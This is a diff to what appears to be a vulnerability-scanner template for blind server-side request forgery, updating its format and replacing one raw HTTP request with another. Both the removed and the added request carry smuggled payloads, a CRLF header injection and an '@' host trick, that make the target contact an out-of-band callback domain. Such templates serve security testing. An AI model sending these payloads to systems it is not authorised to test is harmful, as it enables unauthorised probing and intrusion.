@@ -1,17 +1,16 @@
-id: 264
+id: 296
 info:
   author: 0xAwali
   name: Blind SSRF
   severity: info
-requests:
+http:
 - matchers:
   - part: body
     type: word
     words:
     - Your Match
   raw:
-  - 'GET /%20HTTP/1.1%E5%98%8D%E5%98%8AX-Host:%20{{Host}}.{{Port}}.BSSRF-108.{{MY-DOMAIN}}%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A
-    HTTP/1.1
+  - 'GET :@{{Host}}.{{Port}}.BSSRF-128.{{MY-DOMAIN}}/ HTTP/1.1
 
     Host: {{Hostname}}
 
